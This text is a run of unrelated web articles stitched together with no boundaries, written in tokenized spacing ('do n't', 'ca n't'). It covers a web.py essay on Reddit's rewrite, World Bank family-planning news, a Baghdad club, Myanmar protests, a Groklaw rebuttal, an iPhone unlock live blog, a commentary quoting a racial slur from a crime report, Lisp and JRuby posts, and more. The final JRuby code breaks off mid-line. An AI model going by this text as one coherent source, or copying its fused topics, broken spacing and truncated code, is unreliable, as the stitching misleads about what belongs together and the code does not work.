Translations : Srpsko- Hrvatski
2012 note : This article was first published in 2005 .
After it was published , Django launched a Removing TheMagic project to address some of my criticisms ( though personally I still find it unusable ) , web.py inspired FriendFeed ’s tornado.web and Google ’s gae .
webapp and others ( though I still prefer web.py ) , and this article led to a permanent surge in Reddit traffic that still has n’t really stopped growing .
Over at reddit.com , we rewrote the site from Lisp to Python in the past week .
It was pretty much done in one weekend .
( Disclosure : We used my web.py library . )
The others knew Lisp ( they wrote their whole site in it ) and they knew Python ( they rewrote their whole site in it ) and yet they decided liked Python better for this project .
The Python version had less code that ran faster and was far easier to read and maintain .
The idea that there is something better than Lisp is apparently inconceivable to some , judging from comments on the reddit blog .
The Lispers instead quickly set about trying to find the real reason behind the switch .
One assumed it must have been divine intervention , since “ there seems to be no other reason for switching to an inferior language . ”
Another figured something else must be going on : “ Could this be …a lie ?
To throw off competition ?
It ’s not as though Paul Graham has n’t hinted at this tactic in his essays … ”
Another chimed in : “ I decided it was a prank . ”
Another suggested the authors simply wanted more “ cut corners , hacks , and faked artisanship . ”
These were , of course , extreme cases .
Others assumed there must have been outside pressure .
“ Either libraries or hiring new programmers I guess . ”
Another concluded : “ some vc suit wants a maintainable - by - joe - programmer product .
I hope he pays you millions . ”
The Lisp newsgroup , comp.lang.lisp , was upset about the switch that they ’re currently planning to write a competitor to reddit in Lisp , to show how right they are or something .
The more sane argued along the lines of saying Lisp ’s value lies in being able to create new linguistic constructs and that for something like a simple web app , this is n’t necessary , since the constructs have been already built .
But even this is n’t true .
web.py was built pretty much from scratch and uses all sorts of “ new linguistic constructs ” and — even better — these constructs have syntax that goes along with them and makes them reasonably readable .
Sure , Python is n’t Perl 6 , so you ca n’t add arbitrary syntax , but you can often find a clever way to get the job done .
Python , on the other hand , has problems of its own .
The biggest is that it has dozens of web application frameworks , but none of them are any good .
Pythonists are well aware of the first part but apparently not of the second , since when I tell them that I ’m using my own library , the universal response is “ I do n’t think Python needs another web application framework ” .
Yes , Python needs fewer web application frameworks .
But it also needs one that does n’t suck .
The framework that seems most promising is Django and indeed we initially attempted to rewrite Reddit in it .
As the most experienced Python programmer , I tried my best to help the others out .
Django seemed great from the outside : a nice - looking website , intelligent and talented developers , and a seeming surplus of nice features .
The developers and community are extremely helpful and responsive to patches and suggestions .
And all the right goals are espoused in their philosophy documents and FAQs .
Unfortunately , however , they seem completely incapable of living up to them .
While Django claims that it ’s “ loosely coupled ” , using it pretty much requires fitting your code into Django ’s worldview .
Django insists on executing your code itself , either through its command - line utility or a specialized server handler called with the appropriate environment variables and Python path .
When you start a project , by default Django creates folders nested four levels deep for your code and while you can move around some files , I had trouble figuring out which ones and how .
Django ’s philosophy says “ Explicit is better than implicit ” , but Django has all sorts of magic .
Database models you create in one file magically appear someplace else deep inside the Django module with a different name .
When your model function is called , new things have been added to its variable - space and old ones removed .
( I ’m told they ’re currently working on fixing both of these , though . )
Another Django goal is “ less code ” , at least for you .
But Django is simply full of code .
Inside the django module are 10 different folders and inside each of those are a few more .
By the time you actually build a site in the Django tutorial , you ’ve imported django.core.meta , django.models.polls , django.conf.urls.defaults .* , django.utils.httpwrappers.HttpResponse , and django.core.extensions.render_to_response .
It ’s not clear how anyone is supposed to remember all that , especially since there appear to be no guiding principles for what goes where or how it ’s named .
Three of these are inserted automatically by the start scripts , but you still need to memorize such names for every other function you want to use .
But Django ’s most important problem is that its developers seem incapable of designing a decent API .
They ’re clearly capable Python programmers — their code uses all sorts of bizarre tricks .
And they ’re clearly able to write code that works — they have all sorts of interesting features .
But they ca n’t seem to shape this code into something that other people can use .
Their APIs are ugly and regularly missing key features : the database API figures out queries by counting underscores but has no special syntax for JOINs , the template system requires four curly braces around every variable and ca n’t do any sort of computation , the form API requires 15 lines to process a form and ca n’t automatically generate the template .
I tried my best to fix things — and the Django community was extremely supportive — but the task simply dwarfed me .
I just could n’t do it mentally , let alone with the time constraints of having to actually build my own application for my own startup .
And so , Lisp and Django found wanting , we ’re left with web.py .
I ’d like to say that web.py learned from these mistakes and was designed to avoid them , but the truth is that web.py was written long before all this and managed to avoid them anyway .
The way I wrote web.py was simple : I imagined how things should work and then I made that happen .
Sometimes making things just work takes a lot of code .
Sometimes it only takes a little .
But either way , that fact is hidden from the user — they just get the ideal API .
So how should things work ?
The first principle is that code should be clear and simple .
If you want to output some text , you call web.output .
If you want to get form input , you call web.input .
There ’s nothing particularly hard to remember .
The second principle is that web .py should fit your code , not the other way around .
Every function in web.py is completely independent , you can use whichever ones you want .
You can put your files wherever you like , and web.py will happily follow along .
If you want a piece of code to be run as a web app , you call web.run , you do n’t put your code in the magical place so that web .py can run you .
The third principle is that web .py should , by default , do the right thing by the Web .
This means distinguishing between GET and POST properly .
It means simple , canonical URLs which synonyms redirect to .
It means readable HTML with the proper HTTP headers .
And that , as far as I ’m concerned , are pretty much all the principles you need .
They seem pretty simple and obvious to me and I ’m even willing to fudge on some of them , but no other Python web app framework seems to even come close .
( If you know of one , tell me and I ’ll happily recant .
I do n’t want to be in this business . )
Until then , it looks like I ’m forced to do that horrible thing I ’d rather not do : release one more Python web application framework into the world .
You should follow me on twitter here .

Under beleaguered President Paul D. Wolfowitz , the World Bank may be scaling back its long - standing support for family planning , which many countries consider essential to women ’s health and the fight against AIDS .
In an internal e-mail , the bank ’s team leader for Madagascar indicated that one of two managing directors appointed by Wolfowitz ordered the removal of all references to family planning from a document laying out strategy for the African nation .
And a draft of the bank ’s long - term health program strategy overseen by the same official makes almost no mention of family planning , suggesting a wider rollback may be underway .
For the record : For The Record
Los Angeles Times Saturday April 21 , 2007 Home Edition Main News Part A Page 2 National Desk 0 inches ; 29 words Type of Material : Correction
World Bank :
An article in Thursday ’s Section A about the World Bank ’s stance on family planning said the Gates Foundation receives loans from the World Bank .
It does not .
The World Bank has traditionally championed birth control and other methods of family planning as a key strategy to improve women ’s health and economic status .
The controversy has raised worries among some bank officials and health advocates that the Bush administration ’s conservative stance on family planning issues may be seeping into the institution .
Advertisement
The managing director , Juan Jose Daboub , denied he was making substantial changes to the bank ’s policy or that he demanded deletions to the Madagascar report .
Daboub , a Roman Catholic with ties to a conservative Salvadoran political party , questioned staff outrage directed at him .
“ To me this sounds like a storm in a glass of water , ” he said in a recent interview .
“ There is no reason understandable for this . ”
Bank staff members dispute Daboub ’s claim that he made no changes to the Madagascar report .
“ It ’s a blatant lie , ” said one staffer who has seen the document .
Like other internal critics , the employee requested anonymity because he said he feared for his job .
A copy of the report obtained by the Los Angeles Times shows repeated deletions of references to family planning and contraception .

Women ’s health advocates said the situation was worrisome .
“ There ’s mismanagement there , ” said Carmen Barroso , a regional director for the International Planned Parenthood Federation .
“ Wolfowitz appointed a guy in a very high position who felt free to censor in line with his personal beliefs .
I think that ’s good grounds for sacking . ”
The controversy has added fuel to anger at the bank over Wolfowitz ’s management style and his involvement in two unusual and large pay raises given to his girlfriend , Shaha Ali Riza , a bank employee on loan to the State Department .
Wolfowitz ’s problems have been compounded by revelations that Defense Department officials told one of their contractors to hire Riza for a short - term contract while Wolfowitz was the deputy Defense secretary .
The Pentagon announced Wednesday that it was looking into the matter .
These issues will be on the table as the bank ’s board of directors meets today to debate Wolfowitz ’s future .

The board reportedly met Tuesday to discuss changes made to a draft document that lays out a long - term “ Strategy for Health , Nutrition and Population Results . ”
These papers , periodically revised , set bank policy and shape funding .
Overseen by Daboub ’s office , a draft version raised alarms among some staff members because it contained only one reference to family planning , and that was to a past project .
The current policy paper refers to family planning at least 23 times , repeatedly identifying it as a fundamental tool for tackling poverty and disease .
Scaling back family planning funding “ would have a tremendous impact because the World Bank is a major lender in the health sector , particularly in the poorest countries , ” said Bea Edwards , international director at the nonprofit Government Accountability Project .

The bank lends to private organizations such as the Gates Foundation as well as the United Nations Capital Development Fund .
The Bush administration has imposed its beliefs about family planning and abortion on other international organizations .
It has cut funding for U.N. agencies that promote family planning , forbidden any group it funds to discuss abortion and pushed abstinence programs .
Bank staff members say the Madagascar plan has been finalized and worry that other country plans may be altered as well .

Daboub said he would send at least 11 country reports , including Benin , Chad and Cameroon , to the board before December .
“ I respect the freedom of our partner countries to decide ” on family planning , he wrote in an e-mail to colleagues meant to quell their anger .
Daboub said he did not ask that family planning be struck from the Madagascar report .
“ It is not true , ” he said .
Yet internal e-mails obtained by the Government Accountability Project appear to indicate otherwise .
Referring to Daboub as the “ MD , ” an acronym for his title as managing director , Madagascar country program coordinator Lilia Burunciuc wrote to colleagues on March 8 , 2007 : “ One of the requests received from the MD was to take out all references to family planning .
We did that . ”
Burunciuc added that this is “ a potential problem for us ” because Madagascar had made a “ strong request for help ” on family planning in the document , which serves as a three - to four - year plan for the goals a country wants to achieve with the bank ’s help .

Madagascar identified improved family planning as one of its national commitments .
Yet a copy of the report includes edits and deletions , which a bank staffer said were made by Daboub ’s office , showing that specific targets to boost contraceptive use were cut and broader aims were rewritten .
In one graphic , the words “ improved quality of health services to ensure easy access , affordability and reliability ” were inserted in place of “ improved access and provision of contraceptives . ”

Editor 's note : CNN agreed to use only the first names of the two women profiled in this story due to concern for their safety .
The swimming pool at this social club provides a break from the chaos of the rest of Baghdad .
more photos »
BAGHDAD , Iraq ( CNN ) --
Against the dust - colored , dreary Baghdad skyline , the bright colors of this social club glitter almost unnaturally .
The turquoise water of the swimming pool jumps out at you along with the bright , rainbow - like colors of swimming trunks , towels and inner tubes .
It 's an illusion of normalcy , carefully guarded from the horrors of the streets of Baghdad .
Here , boys cannonball into the water ; young girls sit along the edge of the pool in tight jeans and fashionable flowing summer tops ; and parents relax in their chairs .
Watch kids splash in the pool »
It 's a mix of Baghdad 's remaining elite -- be it Sunnis , Shiites or Kurds .
Here , ethnicity does n't matter .
The club costs $ 400 a year for a family membership .
They seemingly do n't have a care in the world .
That is , until you listen to what they have to say .
Fatma -- an Iraqi woman wearing designer sunglasses , an elegant brown jacket and fancy gold jewelry on this day -- talked with her friend , Amal , about a recent car bombing that killed 15 people .
" I was arguing with myself yesterday and I was saying , ' I am going to the pool to have a good time , and they are dead .
But if I stay at home , what can I do for them ?
Will it change anything for them ? ' "
She pauses .
" I could n't help it .
I cried for them . "
But moments later , the two women laugh , not at a joke , but at their lives -- or what has become of them .
See how children and their parents enjoy the pool »
" We wake up in the morning .
There 's no power , no water , " Amal says .
She catches Fatma 's eye , and the two dissolve into giggles .
" Have n't you heard the expression it makes you laugh and cry ? " Fatma says .
" That 's how we live .
We deceive ourselves .
But there 's something inside crushing us . "
Amal adds , " It 's not like what we have seen is nothing -- all the killing , murder , the explosions . "
Nearby , one of Amal 's daughters , 7 - year - old Golmaz , splashes happily around the pool in her inner tube , avoiding her brother , who has Sesame Street floaties on his arms and is trying to pester her .
" At home , I am bored and scared and lonely ; it makes me sad , " Golmaz says .
" But when I come here , I am happy . "
It takes her mind off the gruesome images of people dying in the war that surrounds them .
" Once , there was a bomb close to the bridge .
Lots of people died .
I saw it from the window .
I cried , " the little girl says , then swims away .
Her words are piercing .
Welcome to Iraq 's grieving oasis .
Tears begin streaming down Fatma 's face as she recalls how she has n't been able to visit her parents at her childhood home for the last three years .
" I wish , I wish , I wish I could just go and sit in my house .
Go back to the old days , " she says .
Here , everyone talks of the " old days . "
The club is a shadow of what it once was .
Two of the pools lie empty , the gardens are deserted and no one is in the club 's lounge .
Faris Abdul Rahman , the club 's secretary - general , speaks wistfully of the past .
" You [ would ] see so many , full of families here .
...
They [ were ] happy , joking , playing cards . "
It could n't be further from the scene now .
A broken piano stands against the back wall in the club 's lounge .
Half the piano's keys are missing , and its strings are snapped in a twisted mess .
" I thought that once the Americans came , life would be something else , life would somehow be brighter , " Fatma says .
Still , despite everything going on around her , she says she will never leave her homeland .
" I will not leave Iraq , I will not desert Iraq , " she says .
" If I die , I will die in my house -- no matter how many times my husband says , ' Let 's go . ' "

I was curious …
… and I stumbled upon this image of the face on Mars :
There ’s an even more detailed 2400 ×2400 pixel image here .
There are other pictures of the ‘ pyramids ’ nearby if you follow the links on the Cydonia wikipedia page .
What ’s even cooler is I found the smiley face on Mars , otherwise known as the Galle crater .
I just read Chapter IX of Watchmen and thought Alan Moore was having some fun .
But the thing actually exists !
Here it is on Google Mars .
Hundreds of Buddhist monks marched through rain - washed streets for the third day in Myanmar ’s main city yesterday , taking the lead in monthlong protests that the military junta has so far been powerless to contain .
They prayed at the gold - spired Shwedagon Pagoda , the nation ’s holiest shrine , then wound through the streets of the city , Yangon , before disbanding in late afternoon and announcing that they would march again , wire services reported .
The involvement of large numbers of monks has increased the challenge to the government in a nation where the Buddhist clergy is highly revered and is the most organized group apart from the military .
The current protests began after the government raised fuel prices on Aug. 15 without warning or explanation by as much as 500 percent .

Growing up in Flushing , Queens , he played guitar and drums , idolized Jimi Hendrix and performed in cover bands .
Later , he went on the road as Ringo in the musical “ Beatlemania . ”
These days , if his left ear happens to be covered by a pillow , Mr. Bellusci , 47 , hears the alarm clock as a faint tick , tick , tick , not a blaring BEEP , BEEP , BEEP .
In cacophonous restaurants , he watches people ’s mouths so he can follow the conversation .
Years of high decibel noise and trauma from speaker feedback damaged his right ear .
Mr. Bellusci , who plays ukulele , recorder , guitar and bass in an acoustic duo , now says , “ If I could do it over again ... ”
How many boomers are thinking the same thing .
As more members of the generation born after World War II enter their 60s , and the effects of age conspire with years of hearing abuse , a number find themselves jacking up the volume on their televisions , cringing at boisterous parties and shouting “ What ? ” into their cellphones .

As I was reading this morning Twenty - Five Ways To Suppress Truth : The Rules of Disinformation I was pointed to about Groklaw 's latest attempt to defy gravity .
As it is becoming common in some circles , some folks like to be purer than the virgin Mary .
Groklaw has been for a while expanding into new levels of fundamentalism .
The ends justify the means and all that :
That , to me , was n't the news , since a Microsoft license was submitted once before , although I gather not by the company .
But what I 'm noticing is reactions .
ComputerWorld collected some truly astonishing responses , and if you follow their links , it gets worse .
First , though , the reaction that matters , from Michael Tiemann : Michael Tiemann , president of the non-profit Open Source Initiative , said that provisions in three out of five of Microsoft 's shared - source licenses that restrict source code to running only on the Windows operating system would contravene a fundamental tenet of open - source licenses as laid out by the OSI .
By those rules , code must be free for anyone to view , use , modify as they see fit .
" I am certain that if they say Windows - only machines , that would not fly because that would restrict the field of use , " said Tiemann in an interview late Friday .
Why would this need to be said ?
What nerve Microsoft has to even dream of trying for such a restriction .
A license that restricts use to only the Windows operating system .
Why would OSI even consider that ?
Have we lost our minds ?
Groklaw : Another Smooth Move from Microsoft : Watch out , Ruby .
Watch out OSI .
Really ?
4 . Use a straw man .
Find or create a seeming element of your opponent 's argument which you can easily knock down to make yourself look good and the opponent to look bad .
Either make up an issue you may safely imply exists based on your interpretation of the opponent / opponent arguments / situation , or select the weakest aspect of the weakest charges .
Amplify their significance and destroy them in a way which appears to debunk all the charges , real and fabricated alike , while actually avoiding discussion of the real issues .
The Rules of Disinformation
Microsoft has a number of licenses under the " Shared Source " umbrella .
Most of them are completely useless from an open source standpoint .
Michael Tiemann correctly points that out and they would fail the test .
The only license that can be submitted for OSI approval is the Microsoft Permissive License ( Ms - PL ) and possibly the Microsoft Community License ( Ms- CL ) .
The former is an Apache - like license , the latter is a GPL - like license .
Am personally only interested in the first as that is what IronPython , IronRuby , the Dynamic Language Runtime and the ASP.
NET client library are licensed under .
Groklaw goes on to rally up the troops over * other * licenses that are not even under discussion .
You would think that this was so obvious that it did not need pointing out , but I guess it needs pointing out .
Later Groklaw seems confused : how a company can have software open sourced but not embrace it as an open source ?
And does Microsoft want to be an Open Source company ?
Puh - lease .
They may want you to think that , but Steve Ballmer just told the world that it can't embrace that model : " Open source has been the issue that surrounds us .
Could a commercial model like Microsoft compete with open source ?
And we 've worked very hard on making the value of a commercial company surpass what the open - source community can deliver , because frankly , it 's not a business model we can embrace .
It 's inconsistent with shareholder value . "
Does it get any clearer ?
And if they have no intention of adopting that business model , the right question is : why are they proposing open source licenses ?
There is no contradiction here .
It is only contradictory if you live in a binary world world of black and white .
Or if you find images like this to be magic :
You can open source pieces of software , contribute to open source projects and still not embrace open source as your business model .
It is easy to prove this by way of existing examples .
Consider IBM and Google : they use open source software , they contribute to open source projects and they fund open source development , but yet their business model is not an open source model .
An ugly trend is the adoption of the absolutist mindsets .
" You are with us or you are against us " .
Well , for one , am not with Groklaw and am not with Microsoft .
My goal is to make open source succeed as a platform and use open source for all of my server and desktop activities .
I see no problem in taking open source contribution from companies that have not embraced open source as their business model as long as the code is open source .
So I will happily consume open source code produced by Google , IBM and even Microsoft .
Groklaw asks :
By the way , guys , check those license submissions carefully .
Do they exclude the GPL ?
Do they exclude sublicensing or allow it only if the sublicensee contacts Microsoft to get permission ?
How about if a licensee sells the company ?
Well , you would think they would have read the license , but it is easier to get on a rage binge than actually reading the licenses .
There is no exclusion for the GPL or Copy - left licenses , the only problem is that the GPL is incompatible with pretty much anything , so chances are these will be incompatible altough am no lawyer and I do not know for sure ;
They do not exclude sublicensing and you do not need permission from Microsoft , nor do you need to contact them if you sell the company .
The rage binge continues :
In that connection , I suggest you look very , very carefully at the IronRuby initiative .
The first rule with Microsoft proposals has to be : look for the devilish part .
It wo n't be obvious .
Here 's the license for it , Microsoft 's Permissive Licence , one of the shared source licenses .
Is it Open Source ?
The MsPL seems to satisfy both the open source definition and the Debian Free Software Guidelines .
Groklaw questions IronRuby motives and in the best conspiracy theory tone ponders :
Is that the only question we should be asking ?
Here 's another .
Is IronRuby Ruby ? [...]
Ruby with a Microsoft twist .
Obviously they do not know much about IronPython and IronRuby and the trouble they went to in IronPython to remain compatible with CPython .
The troubles they went into to be compatible have been explained numerous times , but they are also available on Jim's Zen of the DLR slide deck .
I removed the OpenXML remarks as they were just more pandering .
The article continues by mixing half - facts and speculation as it is now a tradition over there :
In Ruby 's case , my understanding is that it started as Ruby .
NET under the MIT license .
It has different goals , IronRuby is layered on top of the DLR .
They got permission to reuse the parser and tokenizer from Ruby .
NET which had done all the leg - work of figuring it out ( since Ruby does not have a formal language specification ) .
The half facts continue :
Microsoft has added some WPF functions to it .
WPF stands for Windows Presentation Foundation .
Some would tell you that WPF threatens an open web , the W3 c standards , and basically anything involved with the open Internet .
I do n't know , not being a programmer , but that 's what I hear .
I will agree that you do not know what you are talking about .
IronRuby can call any CLI methods and classes just like Ruby .
NET and IronPython can ( or , gasp , CPython extensions can do so as well ) .
WPF being just a collection of .NET classes they can be invoked by IronRuby .
Being able to call CLI code is why I can write IronRuby applications that use Gtk# today on Linux without any changes to IronRuby , there is no magic needed :
IronRuby Alpha running on Linux /x86 with Mono , calling Gtk# .
LOOKOUT !
ITS SPIDER PIG !
MICROSOFT'S SECRET PLOT TO OVERTAKE THE INTERNETS BY ADDING GTK # SUPPORT TO IRONRUBY !
Oh wait .
Does that means that libraries are an evil plot as well ?
Tune in next week at the same bat - time on the same bat - channel for an answer .
Then , Groklaw tries a little of guilt by association , always a fine choice in the most reputable sophistry circles :
For me , it 's enough of a warning that Miguel likes the MPL as he did the patent deal and all things Microsoft .
He says the license is " by all intents and purposes an open source license " .
Whose intents ?
And whose purposes ?
Remember Lily Tomlin's old joke ?
If love is the answer , can you rephrase the question ?
And if this is " by all intents and purposes an open source license " then maybe it 's time to look at that definition again .
Facts and legal terms mean nothing .
If Miguel likes it , it must be bad .
I hope Groklaw gets nominated for " Best use of Fallacies to Advance a Political Cause " award next year .
So if the license were to fit the open source definition then " it 's time to look at the definition again " .
Why ?
Well , because Groklaw said so .
Not because " they know " as we already know that they barely researched the subject .
Now am off to get some more work done on Moonlight , which will serve two purposes : allow Linux users to access Silverlight content and produce an ulcer on Groklaw 's posters .
Disclaimers
And as usual to avoid the usual round trip in the comments :
I speak for myself , I do not speak for Novell ;
This blog entry does not represents the views of my employer .
I do not like Microsoft 's overall business model , I do not like the pricing , I do not like lock - in into proprietary standards , do not like their patent threats , nor do I endorse FUD ( theirs or anyone else 's ) .
Liking MsPL does not mean " endorsing Microsoft " wholeheartedly .
I have been asking for collaboration between Microsoft and the open source community for years , and advocating it with their employees and representatives at every turn in the past .
Most recently , before I even knew about the Microsoft / Novell agreement am on the record calling for such a thing .
I think that we have reached a sorry state when our community has to resort to half - truths pandering with fear , uncertainty and doubt .
The very actions that people criticize Microsoft for .
We can do better than that .
Russia 's strategic bombers have resumed their Cold War practice of flying long - haul missions to areas patrolled by NATO and the United States , a Russian general says .
On Wednesday a Russian bomber flew over a US military base on the Pacific island of Guam and " exchanged smiles " with US pilots scrambled to track it , said Major - General Pavel Androsov , head of long - range aviation in the Russian air force .
" It has always been the tradition of our long - range aviation to fly far into the ocean , to meet ( US ) aircraft carriers and greet ( US pilots ) visually , " Androsov told a news conference .

The free software iPhone unlock — the only one that counts — has been finally achieved by the iPhone Dev Team and it has been independently tested .
Everyone can now unlock their iPhones for free .
The unlock was not achieved by GeoHot , who was credited with the first hardware unlocks .

Details are thin at the moment , but the free unlock appears to have been achieved by the usual suspects according to some of their claims on IRC channels .
Apparently some hackers are exploiting the same buffer bug that the iPhone Sim Free people used to achieve their unlocks , but it is their own independent and free unlock .
Keep checking back for updates after the jump .
And remember , no Death Star exploding until it gets fully confirmed .
[ Last update 6:49 PM EST ]
[ Updated 6:35 PM EDT ]
So far , we know that GeoHot , of the hardware unlock fame , is claiming in IRC channels that he has unlocked the iPhone using the same method as iPhone Sim Free .

[ Updated 6:47 PM EDT ]
At this time , GeoHot has n't made public any details yet .
Meanwhile , hackers from the iPhone Dev Team kept testing the way that Gray suggested .
Be aware that it 's still not clear if GeoHot 's claims are true or not .
Unless his claims are independently tested by the community , and the unlock proven to be his work — which has n't been proved either — the Death Star wo n't explode .

[ Updated 6:49 PM EDT ]
While all this is happening , another Dev Team group is currently testing another unlock software right now , which is also " similar to IPSF but works with patching a fls , not some strange bootloader code . "
[ Updated 7:10 PM EDT - EXCLUSIVE COVERAGE ]
The unlock has been achieved , but not by GeoHot .
Meanwhile , the true iPhone Dev Team hackers were able to put it together , which is going to be available in Deadbeef shortly , according to them .

Update 8:10 PM EDT
File is now available .
See above .
[ Final update 11:01 PM EDT ]
This has been fun .
I 'm still writing the tutorial for the unlock ( it 's coming , we just want to make it really easy for everyone ) but I wanted to share the particular moment when the Giz witnessed how they tried the patch for the first time and succeeded .
We were " watching " the events in real time :
1:05 AM
ok
i think we got it
wait 10 min for vertify ok ?
me : ok unlocking as we speak lets see 1:10 AM man free unlock me : YEAH !
wait for another vertification and we are set
The Giz has been following the unlocking effort for a very long time now .
They hacked into it , activated it , created the tools to develop third - party apps and all the unlocks , including this one .

Now that the search for the unlock is over , they will keep working on more developments for the iPhone and future Apple devices , things like the iPod touch .
That 's why they are still asking for donations .
If you think their work is worth it , they tell us you can send money to this PayPal address :
iphone.devteam@googlemail.com ( yes , it 's googlemail.com , not gmail.com )
IMPORTANT : as the subject of the transfer , do n't mention the word " hack " or " hacking " as PayPal is very sensitive about these things .

People on the island of Bougainville in Papua New Guinea have found their own solution to high energy prices - the humble coconut .
They are developing mini-refineries that produce a coconut oil that can replace diesel .
From police officers to priests , the locals are powering up their vehicles and generators with coco-fuel .
Inquiries for the coconut power have come in from overseas , including Iran and Europe .
For years , the people of Bougainville have been dependent on expensive fuel imported onto the island .
Shortages have often caused many businesses in this part of Papua New Guinea to grind to a halt .
High energy costs have not helped either .
Does n't it sound good if you really run your car on something which falls off a tree and that 's the good thing about it
Matthias Horn
Refinery operator
Matthias Horn , a German migrant and an engineer , operates one such refinery .
" They sometimes refer to me as the Mad German because how can you do that to your car ... filling it with some coconut juice that you normally fry your fish in , " he said .
" The coconut tree is a beautiful tree .
Does n't it sound good if you really run your car on something which falls off a tree and that 's the good thing about it .
You run your car and it smells nice and it's environmentally friendly and that 's the main thing . "
Mr Horn said his work had attracted interest from Iran .
Refineries like his also produce oils for cooking and cosmetics as well as soap .
Coconut power is not new in Bougainville .
The island endured years of civil unrest in which thousands of people were killed in a fight for independence in the 1990s .
Dwindling supplies of diesel forced islanders to look for alternatives and the coconut was chosen .
In peacetime , new technology is propelling this sweet - smelling industry to greater heights .
( CNN ) --
When federal prosecutors in Virginia released details of the dogfighting charges against Atlanta Falcons quarterback Michael Vick , all hell broke loose .
Martin suggests the Vick case revealed the public and media care more about celebrity and animals than people .
Folks were protesting , calling for him to be immediately kicked out of the league , and demanding long jail sentences for Vick and his co-defendants .
Many lawyers went on television and admitted that had Vick beat a girlfriend , shot or even murdered someone , he would n't have been slammed as hard as he was for the vicious acts committed against dogs .
I suppose those lawyers are right .
Just look at the case of Megan Williams .
The 20 - year - old West Virginia woman , Megan Williams , was kidnapped by six sadistic individuals and held in a mobile home .
They raped her , forced her to eat rat and dog feces , made her drink from a toilet , stabbed her multiple times , and called the black woman a " nigger " every time they beat her .
Thank God she lived , and may be released from the hospital in a few days .
Watch the alleged victim's mother talk about hearing the news »
But it still raises the question :
What causes such outrage and fervor in one case involving dogs and not another ?
The same thing was said about the shocking details surrounding the deaths of Channon Christian and Christopher Newsom .
The two University of Tennessee students were on a date when they were carjacked by several men .
They were taken to a house where they were held .
Christopher was raped , doused with gasoline , shot and his body dumped on the side of a road .
Channon ?
She had a household cleaner poured down her throat and was later raped .
She , too , was murdered .
Although the two were white and their alleged attackers black , police say race was not an element in this case .
These two cases are heinous and despicable .
But why do we respond with speed to one case and not another ?
Is it celebrity ?
Or do we not have the same compassion for human beings as we do for dogs ?
Was the Vick case that more important ?
Take , for example , the U.S. Senate floor speech of Robert Byrd , the senior senator from West Virginia .
Calling the allegations sadistic , Byrd thundered : " Barbaric !
Let that word resound from hill to hill , and from mountain to mountain , from valley to valley , across this broad land .
Barbaric !
Barbaric !
May
God help those poor souls who'd be so cruel .
Barbaric !
Hear me !
Barbaric ! "
He later added : " I am confident the hottest places in hell are reserved for the souls of sick and brutal people who hold God 's creatures in such brutal and cruel contempt . "
So , Sen .
Byrd , where is the floor speech for a woman from your own home state ?
Where is the outrage when a woman is viciously attacked ?
This is when the media gets slammed .
We 've determined that Vick , Paris Hilton and the shenanigans of Lindsey Lohan are far more important than the viciousness of what took place in West Virginia and Tennessee .
But maybe the problem is n't just the media .
Maybe the problem is you .
The reader .
The viewer .
Maybe you 've decided that you care more about discussing a celebrity than nobodies like Megan Williams , Channon Christian or Christopher Newsom .

Like many others , I 've been reading Toby Segaran 's Programming Collective Intelligence .
Toby 's examples are in Python .
Inspired by loucal 's posting of code examples in Ruby , I 've decided to put up my own Common Lisp examples .
These are from Chapter 2 , going up to page 15 , " Ranking the Critics " .
In order to just have the recommendations in the file , I used assoc lists instead of hashes .
One place where Python ( and Ruby ) has it over Lisp is in hash syntax , justinstead ofor .
I made a ' critics ' function to keep down the verbosity .
Is there a good way to change the syntax for hash lookup ?
The other big difference is my use ofandeverywhere instead of Python 's list comprehensions , with the occaisionalthrown in .
If the Python source code gets posted , I may try some benchmarks with later examples .
This is absolutely ridiculous .
It 's always the victim 's fault .
Why can't these people ever just admit they 're incompetent and can't run a government ?
( Rhetorical question . )
AP via HuffPo :
The White House fought back Tuesday against criticism from Kansas ' governor that National Guard deployments to Iraq are slowing the response to last week 's devastating tornado .
White House press secretary Tony Snow said the fault was Kansas Gov. Kathleen Sebelius ' .
In a spat reminiscent of White House finger - pointing at Louisiana Gov. Kathleen Blanco after the federal government 's botched response to Hurricane Katrina , Snow rapped Sebelius for not following procedure to find gaps and then asking the federal government to fill them .
" If you do n't request it , you 're not going to get it , " he said .
One slight problem : Governor Sebelius did request it .
In fact , she took her concerns to Bush personally in 2006 :
Sebelius , a Democrat , has written the Pentagon twice and spoke about the issue at great length with Bush in January 2006 when they rode together from Topeka to a lecture in Manhattan .
" He assured me that he had additional equipment in his budget a year ago .
What the Defense Department said then and continues to say is that states will get about 90 percent of what they had , " Sebelius said .
" Meanwhile , it does n't get any better .
I 'm at a loss . "
So apparently it does n't matter if you " request it " ; you 're still not getting it .
What 's more , ThinkProgress notes three other times Governor Sebelius lobbied the Pentagon to replace missing equipment .
The governor is not to blame here .
She did n't start the war , and she did n't decide to send to send the National Guard equipment to Iraq .
And despite her constant efforts to get that equipment back in order to deal with disasters like last weekend 's tornado , it 's still her fault .
Have they no shame ?
( Another rhetorical question . )
With the housing market in decline , financial predators are finding yet another way to take advantage of people who fall behind on their payments .
The schemes take various forms and often involve promises to distressed homeowners of cash upfront , free monthly rent and a chance to retain their houses in the long run .
But in the process , someone else takes over the deed , borrows as much as possible against the value of the house and pockets the cash .
And , almost always , the homeowners still end up losing their homes .
There are no nationwide numbers on this common fraud , known as equity stripping , but it has turned up in almost every state .
Seven states have passed laws to try to stop it .
Still , with foreclosure rates rising rapidly , it will be a growing problem , consumer advocates say .
“ Conditions now are perfect for these scams , ” said Lauren K. Saunders , managing attorney at the National Consumer Law Center in Washington .
“ We are at the end of a period of rising real estate prices , so a lot of people have equity in their homes .
But we also have a foreclosure crisis . ”
JRuby + SWT = Future Cross Platform Ruby Desktop App Development ?
By Peter Cooper
( Disclaimer : I 'm no Java wiz , so if I get anything wrong about Java or its libraries , post comments ! )
The SWT ( Standard Widget Toolkit ) is a GUI widget toolkit for the Java platform .
Unlike AWT and Swing , it uses the local operating system 's own controls .
This means you can develop Java apps that ' look native ' on multiple platforms .
The popular Eclipse IDE uses SWT to work and looks graphically native on multiple platforms ( as does Azureus ) .
SWT is also , reputedly , faster than the other alternatives .
Sounds great for developers , right ?
Java developers .. sure .
I decided SWT was too good an idea to not investigate , so I downloaded JRuby 0.9.1 ( a Ruby interpreter written in Java and which provides access to Java classes from Ruby ) and set to work .
All I had to do was copy the swt. jar and supporting files for my platform into the jruby / lib folder , add " - Djava.library.path=$JRUBY_BASE/lib " into the Java call in the bin / jruby helper script .. and then I could write and run code like this :
require ' java ' module SWTTest include_package ' org.eclipse.swt ' include_package ' org.eclipse.swt.layout ' include_package ' org.eclipse.swt.widgets ' Display .
setAppName " Ruby SWT
Test " display = Display .
new shell =
